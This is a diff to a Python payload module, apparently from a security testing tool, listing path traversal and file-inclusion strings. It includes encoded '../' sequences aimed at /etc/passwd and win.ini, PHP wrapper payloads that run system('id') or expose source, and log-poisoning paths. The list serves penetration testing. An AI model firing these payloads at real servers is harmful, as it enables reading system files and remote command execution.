@@ -3,10 +3,10 @@ AIPT Path Traversal Payloads
 
 Directory traversal / LFI payloads for security testing.
 """
+
 from __future__ import annotations
 
 from typing import Iterator
-from urllib.parse import quote
 
 
 class PathTraversalPayloads:
@@ -80,17 +80,13 @@ class PathTraversalPayloads:
             "%2e%2e%2f" * 5 + "etc/passwd",
             "%2e%2e/" * 5 + "etc/passwd",
             "..%2f" * 5 + "etc/passwd",
-
             # Double URL encoding
             "%252e%252e%252f" * 5 + "etc/passwd",
-
             # UTF-8 encoding
             "..%c0%af" * 5 + "etc/passwd",
             "..%c1%9c" * 5 + "etc/passwd",
-
             # 16-bit Unicode
             "%u002e%u002e%u002f" * 5 + "etc/passwd",
-
             # Overlong UTF-8
             "..%c0%ae/" * 5 + "etc/passwd",
         ]
@@ -103,21 +99,16 @@ class PathTraversalPayloads:
             # Double dots
             "....//....//....//etc/passwd",
             "..../..../..../etc/passwd",
-
             # Mixed slashes
             "..\\../..\\../etc/passwd",
             "..//..//..//etc/passwd",
-
             # With current directory
             "./.././.././../etc/passwd",
             ".//..//./..//etc/passwd",
-
             # Absolute with traversal
             "/var/www/../../etc/passwd",
-
             # Path truncation (old systems)
             "../" * 100 + "etc/passwd",
-
             # Windows UNC paths
             "\\\\localhost\\c$\\windows\\win.ini",
             "//localhost/c$/windows/win.ini",
@@ -132,23 +123,17 @@ class PathTraversalPayloads:
             "php://filter/convert.base64-encode/resource=index.php",
             "php://filter/read=string.rot13/resource=index.php",
             "php://filter/convert.iconv.utf-8.utf-16/resource=index.php",
-
             # php://input (requires POST)
             "php://input",
-
             # data:// wrapper
             "data://text/plain,<?php system('id');?>",
             "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",
-
             # expect:// wrapper
             "expect://id",
-
             # phar:// wrapper
             "phar://uploads/avatar.jpg/test.php",
-
             # zip:// wrapper
             "zip://uploads/archive.zip#shell.php",
-
             # Log poisoning
             "/var/log/apache2/access.log",
             "/var/log/apache2/error.log",
